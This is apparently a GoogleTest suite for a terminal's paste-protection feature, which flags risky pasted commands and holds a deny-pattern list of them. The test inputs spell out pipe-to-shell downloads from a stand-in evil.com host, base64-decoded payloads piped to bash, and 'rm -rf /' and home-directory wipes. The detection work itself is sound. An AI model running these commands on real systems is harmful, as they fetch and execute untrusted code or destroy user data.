#include <gtest/gtest.h>
#include "termcore/paste_guard.h"
#include "termcore/config.h"

using namespace termcore;

// Custom danger signal bit used by Lua-registered patterns
static constexpr uint32_t kCustomDangerBit = (1u << 16);

// Helper: register all default danger patterns (mirrors paste_guard.lua)
static void registerDefaultPatterns(PasteGuard& guard) {
    // sudo commands
    guard.addCustomDanger("sudo ",        "Contains sudo command");
    guard.addCustomDanger("sudo su",      "Contains sudo su (root shell)");
    guard.addCustomDanger("sudo -i",      "Contains sudo -i (root shell)");

    // recursive rm
    guard.addCustomDanger("rm -rf",       "Contains rm -rf command");
    guard.addCustomDanger("rm -r ",       "Contains recursive rm command");
    guard.addCustomDanger("rm -R ",       "Contains recursive rm command");

    // home directory wipe (compound: both substrings must match)
    guard.addCompoundDanger("rm -rf", "~",     "Recursive delete targeting home directory");
    guard.addCompoundDanger("rm -r ",  "~",     "Recursive delete targeting home directory");
    guard.addCompoundDanger("rm -R ",  "~",     "Recursive delete targeting home directory");
    guard.addCompoundDanger("rm -rf", "$HOME",  "Recursive delete targeting $HOME");
    guard.addCompoundDanger("rm -r ",  "$HOME",  "Recursive delete targeting $HOME");
    guard.addCompoundDanger("rm -R ",  "$HOME",  "Recursive delete targeting $HOME");

    // chmod
    guard.addCustomDanger("chmod -R 777", "Dangerous recursive permission change");

    // pipe-to-shell
    guard.addPipeDanger("curl",   "Curl piped to shell");
    guard.addPipeDanger("wget",   "Wget piped to shell");
    guard.addPipeDanger("base64", "Encoded payload piped to shell");
}

class PasteGuardTest : public ::testing::Test {
protected:
    PasteGuard defaultGuard;  // Mode::Multiline, trust_bracketed=true

    void SetUp() override {
        registerDefaultPatterns(defaultGuard);
    }
};

// --- Basic safe/warn ---

TEST_F(PasteGuardTest, SafeSingleLine) {
    auto result = defaultGuard.analyze("echo hello", false);
    EXPECT_EQ(result.danger, PasteDanger::Safe);
    EXPECT_EQ(result.line_count, 1);
    EXPECT_FALSE(result.ends_with_newline);
    EXPECT_EQ(result.signals, 0u);
}

TEST_F(PasteGuardTest, EmptyString) {
    auto result = defaultGuard.analyze("", false);
    EXPECT_EQ(result.danger, PasteDanger::Safe);
    EXPECT_EQ(result.line_count, 0);
}

TEST_F(PasteGuardTest, SafeWithBracketedPaste) {
    auto result = defaultGuard.analyze("line1\nline2\n", true);
    EXPECT_EQ(result.danger, PasteDanger::Safe);
    EXPECT_TRUE(result.bracketed);
}

TEST_F(PasteGuardTest, MultiLineWarn) {
    auto result = defaultGuard.analyze("line1\nline2", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::MultiLine), 0u);
    EXPECT_EQ(result.line_count, 2);
}

TEST_F(PasteGuardTest, TrailingNewlineWarn) {
    auto result = defaultGuard.analyze("echo hello\n", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::TrailingNewline), 0u);
    EXPECT_TRUE(result.ends_with_newline);
}

TEST_F(PasteGuardTest, TrailingCarriageReturn) {
    auto result = defaultGuard.analyze("echo hello\r", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_TRUE(result.ends_with_newline);
}

// --- Line count accuracy ---

TEST_F(PasteGuardTest, LineCountSingleNoNewline) {
    auto result = defaultGuard.analyze("hello", false);
    EXPECT_EQ(result.line_count, 1);
}

TEST_F(PasteGuardTest, LineCountThreeLines) {
    auto result = defaultGuard.analyze("a\nb\nc", false);
    EXPECT_EQ(result.line_count, 3);
}

TEST_F(PasteGuardTest, LineCountTrailingNewline) {
    auto result = defaultGuard.analyze("a\nb\n", false);
    EXPECT_EQ(result.line_count, 3);
}

// --- Sudo ---

TEST_F(PasteGuardTest, SudoCommand) {
    auto result = defaultGuard.analyze("sudo apt install foo", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

TEST_F(PasteGuardTest, SudoNotPartOfWord) {
    // "pseudocode" does not contain "sudo " (with trailing space), so no match
    auto result = defaultGuard.analyze("pseudocode", false);
    EXPECT_EQ(result.signals & kCustomDangerBit, 0u);
}

// --- rm -rf ---

TEST_F(PasteGuardTest, RmRf) {
    auto result = defaultGuard.analyze("rm -rf /tmp/foo", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

TEST_F(PasteGuardTest, RmDashR) {
    auto result = defaultGuard.analyze("rm -r /tmp/foo", false);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

TEST_F(PasteGuardTest, RmCapitalR) {
    auto result = defaultGuard.analyze("rm -R /tmp/foo", false);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

// --- curl | bash ---

TEST_F(PasteGuardTest, CurlPipeBash) {
    auto result = defaultGuard.analyze("curl https://evil.com/install.sh | bash", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

TEST_F(PasteGuardTest, WgetPipeSh) {
    auto result = defaultGuard.analyze("wget -O- https://evil.com/x | sh", false);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

TEST_F(PasteGuardTest, CurlWithoutPipeIsSafe) {
    auto result = defaultGuard.analyze("curl https://example.com", false);
    // "curl" matches add_danger("curl"...) -- but wait, we use addPipeDanger not addCustomDanger
    // for curl. So plain curl without pipe should NOT trigger.
    EXPECT_EQ(result.signals & kCustomDangerBit, 0u);
}

// --- base64 decode ---

TEST_F(PasteGuardTest, Base64DecodePipeBash) {
    auto result = defaultGuard.analyze("echo abc | base64 -d | bash", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

TEST_F(PasteGuardTest, Base64DecodeCapitalD) {
    auto result = defaultGuard.analyze("echo abc | base64 -D | sh", false);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

// --- chmod -R 777 ---

TEST_F(PasteGuardTest, ChmodRecursive777) {
    auto result = defaultGuard.analyze("chmod -R 777 /var/www", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

TEST_F(PasteGuardTest, ChmodWithout777IsSafe) {
    auto result = defaultGuard.analyze("chmod -R 755 /var/www", false);
    EXPECT_EQ(result.signals & kCustomDangerBit, 0u);
}

// --- sudo su / sudo -i ---

TEST_F(PasteGuardTest, SudoSu) {
    auto result = defaultGuard.analyze("sudo su", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

TEST_F(PasteGuardTest, SudoDashI) {
    auto result = defaultGuard.analyze("sudo -i", false);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

// --- Home directory wipe ---

TEST_F(PasteGuardTest, RmRfTilde) {
    auto result = defaultGuard.analyze("rm -rf ~", false);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

TEST_F(PasteGuardTest, RmRfHome) {
    auto result = defaultGuard.analyze("rm -rf $HOME", false);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

// --- Root wipe ---

TEST_F(PasteGuardTest, RmRfSlash) {
    auto result = defaultGuard.analyze("rm -rf /", false);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

TEST_F(PasteGuardTest, RmRfSlashStar) {
    auto result = defaultGuard.analyze("rm -rf /*", false);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

// --- Mode Never ---

TEST_F(PasteGuardTest, ModeNeverBypassesAll) {
    PasteGuard::Config cfg;
    cfg.mode = PasteGuard::Config::Mode::Never;
    PasteGuard guard(cfg);
    registerDefaultPatterns(guard);

    auto result = guard.analyze("sudo rm -rf / | bash\n", false);
    EXPECT_EQ(result.danger, PasteDanger::Safe);
    // Signals are still detected, just danger is Safe.
    EXPECT_NE(result.signals, 0u);
}

// --- Mode Always ---

TEST_F(PasteGuardTest, ModeAlwaysCatchesMultiline) {
    PasteGuard::Config cfg;
    cfg.mode = PasteGuard::Config::Mode::Always;
    cfg.trust_bracketed = false;
    PasteGuard guard(cfg);

    auto result = guard.analyze("echo a\necho b", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
}

TEST_F(PasteGuardTest, ModeAlwaysSafeSingleLine) {
    PasteGuard::Config cfg;
    cfg.mode = PasteGuard::Config::Mode::Always;
    cfg.trust_bracketed = false;
    PasteGuard guard(cfg);

    auto result = guard.analyze("echo hello", false);
    EXPECT_EQ(result.danger, PasteDanger::Safe);
}

// --- Bracketed paste trust ---

TEST_F(PasteGuardTest, BracketedNotTrusted) {
    PasteGuard::Config cfg;
    cfg.mode = PasteGuard::Config::Mode::Multiline;
    cfg.trust_bracketed = false;
    PasteGuard guard(cfg);

    auto result = guard.analyze("line1\nline2", true);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
}

// --- Config defaults ---

TEST(PasteGuardConfigTest, ClipboardPasteProtectionConfig) {
    Config cfg;
    cfg.clipboard_paste_protection = "always";
    EXPECT_EQ(cfg.clipboard_paste_protection, "always");
}

TEST(PasteGuardConfigTest, ClipboardPasteBracketedSafeConfig) {
    Config cfg;
    cfg.clipboard_paste_bracketed_safe = false;
    EXPECT_FALSE(cfg.clipboard_paste_bracketed_safe);
}

TEST(PasteGuardConfigTest, DefaultValues) {
    Config cfg;
    EXPECT_EQ(cfg.clipboard_paste_protection, "multiline");
    EXPECT_TRUE(cfg.clipboard_paste_bracketed_safe);
}

// --- Multi-line with dangerous commands ---

TEST_F(PasteGuardTest, MultiLineWithSudo) {
    auto result = defaultGuard.analyze("echo start\nsudo reboot", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::MultiLine), 0u);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

TEST_F(PasteGuardTest, CurlPipeZsh) {
    auto result = defaultGuard.analyze("curl http://x.com/s | zsh", false);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

TEST_F(PasteGuardTest, EndsWithNewlineFlagAccuracy) {
    EXPECT_FALSE(defaultGuard.analyze("hello", false).ends_with_newline);
    EXPECT_TRUE(defaultGuard.analyze("hello\n", false).ends_with_newline);
    EXPECT_TRUE(defaultGuard.analyze("hello\r", false).ends_with_newline);
    EXPECT_FALSE(defaultGuard.analyze("hello world", false).ends_with_newline);
}

// --- Lua-driven pattern tests (new) ---

TEST(PasteGuardLuaPatterns, NoPatternsRegisteredMeansNoDangerSignals) {
    PasteGuard guard;
    auto result = guard.analyze("sudo rm -rf /", false);
    // Without registered patterns, no custom danger should fire
    EXPECT_EQ(result.signals & kCustomDangerBit, 0u);
}

TEST(PasteGuardLuaPatterns, CompoundPatternRequiresBothMatches) {
    PasteGuard guard;
    guard.addCompoundDanger("rm -rf", "~", "Home wipe");

    // Both present -> match
    auto r1 = guard.analyze("rm -rf ~", false);
    EXPECT_NE(r1.signals & kCustomDangerBit, 0u);

    // Only first -> no match
    auto r2 = guard.analyze("rm -rf /tmp", false);
    EXPECT_EQ(r2.signals & kCustomDangerBit, 0u);

    // Only second -> no match
    auto r3 = guard.analyze("echo ~", false);
    EXPECT_EQ(r3.signals & kCustomDangerBit, 0u);
}

TEST(PasteGuardLuaPatterns, PipeDangerRequiresPipeAndShell) {
    PasteGuard guard;
    guard.addPipeDanger("curl", "Curl piped to shell");

    // curl before pipe, bash after -> match
    auto r1 = guard.analyze("curl http://x | bash", false);
    EXPECT_NE(r1.signals & kCustomDangerBit, 0u);

    // curl without pipe -> no match
    auto r2 = guard.analyze("curl http://x", false);
    EXPECT_EQ(r2.signals & kCustomDangerBit, 0u);

    // curl with pipe but no shell after -> no match
    auto r3 = guard.analyze("curl http://x | grep foo", false);
    EXPECT_EQ(r3.signals & kCustomDangerBit, 0u);
}

TEST(PasteGuardLuaPatterns, PipeDangerDetectsZsh) {
    PasteGuard guard;
    guard.addPipeDanger("wget", "Wget piped to shell");

    auto result = guard.analyze("wget http://x | zsh", false);
    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
}

TEST(PasteGuardLuaPatterns, WhitelistOverridesCustomDanger) {
    PasteGuard guard;
    guard.addCustomDanger("sudo ", "sudo");
    guard.addWhitelist("sudo apt update");

    auto result = guard.analyze("sudo apt update", false);
    EXPECT_EQ(result.danger, PasteDanger::Safe);
}
